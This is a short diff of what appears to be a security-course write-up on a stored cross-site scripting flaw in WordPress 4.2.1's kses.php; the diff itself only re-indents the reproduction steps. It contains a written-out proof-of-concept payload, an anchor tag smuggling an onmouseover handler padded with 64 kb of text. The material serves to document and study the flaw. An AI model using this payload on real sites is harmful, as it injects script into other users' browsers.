@@ -45,8 +45,8 @@ Time spent: 10 hours spent in total
   1. Post a comment with the javascript <a title='x onmouseover=alert(unescape(/hello%20world/.source))
 style=position:absolute;left:0;top:0;width:5000px;height:5000px
  AAAAAAAAAAAA [64 kb] ...'></a>
- 2. Replace the AAAAAA with 64 kb of text
- 3. Mouseover the comment
+  2. Replace the AAAAAA with 64 kb of text
+  3. Mouseover the comment
   - [x] Affected source code:
     - [Link 1](https://core.trac.wordpress.org/browser/tags/4.2.1/src/wp-includes/kses.php)
 
